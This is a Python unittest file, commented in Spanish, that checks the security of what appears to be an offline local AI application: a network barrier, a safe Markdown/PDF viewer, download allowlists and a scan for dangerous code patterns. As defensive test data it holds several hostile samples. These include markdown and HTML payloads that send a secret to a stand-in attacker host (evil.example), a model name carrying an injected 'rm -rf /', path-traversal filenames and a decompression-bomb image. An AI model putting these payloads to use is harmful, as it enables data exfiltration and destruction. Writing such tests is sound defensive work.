"""Pruebas de seguridad: barrera de red, visor seguro, listas cerradas de descargas y patrones peligrosos en el código."""
import re
import subprocess
import sys
import tempfile
import textwrap
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from local_ai_studio.chat import engine as eng  # noqa: E402
from local_ai_studio.core import netguard  # noqa: E402
from local_ai_studio.core.mdview import md_to_html  # noqa: E402

PY = sys.executable


class TestBarreraDeRed(unittest.TestCase):
    def test_local_permitido(self):
        for host in ("localhost", "127.0.0.1", "127.5.4.3", "::1", "[::1]", None, "", "LOCALHOST"):
            self.assertTrue(netguard.is_local_host(host), host)
        for ev, args in (("socket.connect", (object(), ("127.0.0.1", 11434))),
                         ("socket.connect", (object(), ("::1", 11434, 0, 0))),
                         ("socket.getaddrinfo", ("localhost", 11434, 0, 0, 0, 0)),
                         ("socket.connect", (object(), "C:/pipe/local"))):        # AF_UNIX / ruta
            netguard.check_event(ev, args)          # no lanza

    def test_externo_bloqueado(self):
        for host in ("example.com", "8.8.8.8", "192.168.1.10", "10.0.0.5", "0.0.0.0", "evil.example", "127.0.0.1.evil.com"):
            self.assertFalse(netguard.is_local_host(host), host)
            with self.assertRaises(PermissionError, msg=host):
                netguard.check_event("socket.connect", (object(), (host, 80)))
            with self.assertRaises(PermissionError, msg=host):
                netguard.check_event("socket.getaddrinfo", (host, 80, 0, 0, 0, 0))

    def test_dns_exfiltracion_bloqueada(self):
        with self.assertRaises(PermissionError):
            netguard.check_event("socket.gethostbyname", ("datos-robados.evil.example",))

    def test_otros_eventos_se_ignoran(self):
        netguard.check_event("open", ("x",))
        netguard.check_event("socket.bind", (object(), ("0.0.0.0", 1)))

    def test_allow_network_abre_y_cierra(self):
        with self.assertRaises(PermissionError):
            netguard.check_event("socket.connect", (object(), ("huggingface.co", 443)))
        with netguard.allow_network("prueba"):
            netguard.check_event("socket.connect", (object(), ("huggingface.co", 443)))
            with netguard.allow_network("anidada"):
                pass
            netguard.check_event("socket.connect", (object(), ("huggingface.co", 443)))      # sigue abierta
        with self.assertRaises(PermissionError):
            netguard.check_event("socket.connect", (object(), ("huggingface.co", 443)))

    def test_allow_network_se_cierra_si_hay_excepcion(self):
        with self.assertRaises(RuntimeError):
            with netguard.allow_network("falla"):
                raise RuntimeError("x")
        with self.assertRaises(PermissionError):
            netguard.check_event("socket.connect", (object(), ("example.com", 80)))

    def test_proceso_real_no_puede_salir_pero_si_hablar_con_localhost(self):
        """Un intérprete aparte instala la barrera de verdad: Internet falla y un servidor local funciona."""
        code = textwrap.dedent(f"""
            import sys, socket, threading, urllib.request, urllib.error
            sys.path.insert(0, {str(ROOT)!r})
            from local_ai_studio.core import netguard
            netguard.install()
            out = {{}}
            try:
                socket.create_connection(("example.com", 80), timeout=3); out["salida_directa"] = "CONECTÓ"
            except PermissionError:
                out["salida_directa"] = "bloqueada"
            except Exception as e:
                out["salida_directa"] = "otro: " + type(e).__name__
            try:
                urllib.request.urlopen("http://example.com/", timeout=3); out["urllib"] = "CONECTÓ"
            except urllib.error.URLError as e:
                out["urllib"] = "bloqueada" if isinstance(e.reason, PermissionError) else "otro: " + repr(e.reason)
            except Exception as e:
                out["urllib"] = "otro: " + type(e).__name__
            try:
                socket.getaddrinfo("datos.evil.example", 80); out["dns"] = "RESOLVIÓ"
            except PermissionError:
                out["dns"] = "bloqueada"
            except Exception as e:
                out["dns"] = "otro: " + type(e).__name__
            srv = socket.socket(); srv.bind(("127.0.0.1", 0)); srv.listen(1)
            port = srv.getsockname()[1]
            threading.Thread(target=lambda: srv.accept(), daemon=True).start()
            c = socket.create_connection(("127.0.0.1", port), timeout=3); out["local"] = "ok"; c.close()
            import os
            out["offline_env"] = os.environ.get("HF_HUB_OFFLINE")
            print(out)
        """)
        r = subprocess.run([PY, "-I", "-c", code], capture_output=True, text=True, timeout=60)
        self.assertEqual(r.returncode, 0, r.stderr)
        out = eval(r.stdout.strip().splitlines()[-1])
        self.assertEqual(out["salida_directa"], "bloqueada")
        self.assertEqual(out["urllib"], "bloqueada")
        self.assertEqual(out["dns"], "bloqueada")
        self.assertEqual(out["local"], "ok")
        self.assertEqual(out["offline_env"], "1")


class TestVisorSeguroDePdf(unittest.TestCase):
    """El texto de un PDF o de un modelo puede traer HTML, imágenes remotas o enlaces: no se carga nada de fuera."""
    ATAQUES = ["![x](http://evil.example/?q=SECRETO)", "<img src='http://evil.example/p.png'>",
               "<script>fetch('http://evil.example')</script>", "<iframe src='http://evil.example'></iframe>",
               "[clic](http://evil.example/robo)", "<a href='http://evil.example'>x</a>",
               "<link rel=stylesheet href=http://evil.example/x.css>", "<style>@import url(http://evil.example/a.css)</style>",
               "![](//evil.example/x.png)", "<img src=//evil.example/x.png onerror=alert(1)>"]

    def test_ningun_ataque_deja_una_referencia_externa(self):
        for md in self.ATAQUES:
            html = md_to_html("texto " + md, "light", "Segoe UI", formulas=False, safe=True)[0]
            self.assertNotRegex(html, r"(?i)<(script|iframe|link|style|a)\b", md)
            self.assertNotRegex(html, r"(?i)<[^>]*\b(src|href)\s*=\s*[\"']?(https?:)?//", md)      # etiquetas reales, no texto escapado
            self.assertNotRegex(html, r"(?i)<img(?![^>]*src=[\"']data:)", md)

    def test_todas_las_llamadas_de_la_interfaz_usan_modo_seguro(self):
        for f in list((ROOT / "local_ai_studio" / "ui").glob("*.py")) + [ROOT / "local_ai_studio" / "core" / "pdf_export.py", ROOT / "local_ai_studio" / "chat" / "render.py"]:
            for m in re.finditer(r"md_to_html\(([^()]|\([^()]*\))*\)", f.read_text(encoding="utf-8")):
                self.assertIn("safe=True", m.group(0), f"{f.name}: {m.group(0)[:80]}")


class TestListasCerradas(unittest.TestCase):
    def test_solo_se_descargan_modelos_de_ollama_de_la_lista(self):
        client = mock.Mock()
        client.pull.return_value = iter([])
        with mock.patch.object(eng, "get_client", return_value=client):
            for evil in ("evil/backdoor:latest", "../../x", "hf.co/atacante/modelo", "llama3.1:8b; rm -rf /", ""):
                with self.assertRaises(PermissionError, msg=evil):
                    eng.ChatEngine({"ollama": {}}).pull(evil)
            client.pull.assert_not_called()
            eng.ChatEngine({"ollama": {}}).pull("llama3.1:8b")
            client.pull.assert_called_once()

    def test_la_lista_incluye_los_modelos_del_selector(self):
        self.assertTrue(set(eng.CHAT_MODELS) <= eng.ALLOWED_PULLS)

    def test_modelos_de_imagen_con_revision_hash_y_solo_safetensors(self):
        from local_ai_studio.images import models
        for m in models.CATALOG.values():
            self.assertRegex(m.revision, r"^[0-9a-f]{40}$")
            self.assertTrue(all(re.search(r"\.(json|txt|safetensors)$", f) for f in m.files))
        src = (ROOT / "local_ai_studio" / "images" / "generate.py").read_text(encoding="utf-8")
        self.assertIn("use_safetensors=True", src)
        self.assertIn("local_files_only=True", src)       # el pipeline nunca se descarga solo

    def test_descarga_de_imagenes_solo_con_la_red_permitida(self):
        src = (ROOT / "local_ai_studio" / "images" / "models.py").read_text(encoding="utf-8")
        self.assertIn("allow_network(", src)


class TestPatronesPeligrososEnElCodigo(unittest.TestCase):
    """Guardia de regresión: lo que NO debe aparecer en el código de la aplicación."""
    PROHIBIDO = [(r"shell\s*=\s*True", "subprocess con shell"), (r"\bos\.system\(", "os.system"),
                 (r"(?<![\w.])eval\(", "eval()"), (r"(?<![\w.])exec\(", "exec()"), (r"\bpickle\b", "pickle"),
                 (r"yaml\.load\(", "yaml.load sin safe_load"), (r"hashlib\.md5|hashlib\.sha1", "hash débil"),
                 (r"torch\.load\(", "torch.load (pickle)"), (r"verify\s*=\s*False", "TLS sin verificar"),
                 (r"\bmarshal\b", "marshal")]

    def test_no_hay_patrones_peligrosos(self):
        for f in (ROOT / "local_ai_studio").rglob("*.py"):
            text = f.read_text(encoding="utf-8")
            for rx, why in self.PROHIBIDO:
                for m in re.finditer(rx, text):
                    line = text[:m.start()].count("\n") + 1
                    ctx = text.splitlines()[line - 1]
                    if ctx.strip().startswith(("#", '"', "'", "-")) or "nunca" in ctx or "NO " in ctx or "Nunca" in ctx:
                        continue                               # menciones en comentarios o documentación
                    self.fail(f"{f.relative_to(ROOT)}:{line}: {why}: {ctx.strip()}")

    def test_gitignore_protege_datos_y_modelos(self):
        gi = (ROOT / ".gitignore").read_text(encoding="utf-8")
        for pat in ("venv/", "config.yaml", ".env", "conversations/", "outputs/", "models/", "resumenes/", "imagenes/", "*.db",
                    "*.safetensors", "*.log", "*.pdf"):
            self.assertIn(pat, gi, pat)


class TestEntradasHostiles(unittest.TestCase):
    def test_imagen_enorme_se_rechaza(self):
        from PIL import Image
        from local_ai_studio.images import edit
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "bomba.png"
            Image.new("1", (20000, 20000)).save(p)          # 400 megapíxeles que comprimen a casi nada
            with self.assertRaises(Exception):
                edit.load(p)

    def test_nombres_de_archivo_no_escapan_de_la_carpeta(self):
        from local_ai_studio.core.textutil import safe_name
        for evil in ("../../Windows/system32/x", "..\\..\\x", "C:\\x\\y", "con:aux", "a/b\\c", "\x00x", ""):
            n = safe_name(evil)
            self.assertNotRegex(n, r"[\\/:]")
            self.assertTrue(n)

    def test_host_de_ollama_no_local_se_rechaza(self):
        from local_ai_studio.core.ollama_client import enforce_local_host
        for host in ("http://0.0.0.0:11434", "http://192.168.1.5:11434", "http://evil.example", "https://ollama.com"):
            with self.assertRaises(RuntimeError, msg=host):
                enforce_local_host(host)
        enforce_local_host("http://127.0.0.1:11434")
        enforce_local_host("http://localhost:11434")


if __name__ == "__main__":
    unittest.main()
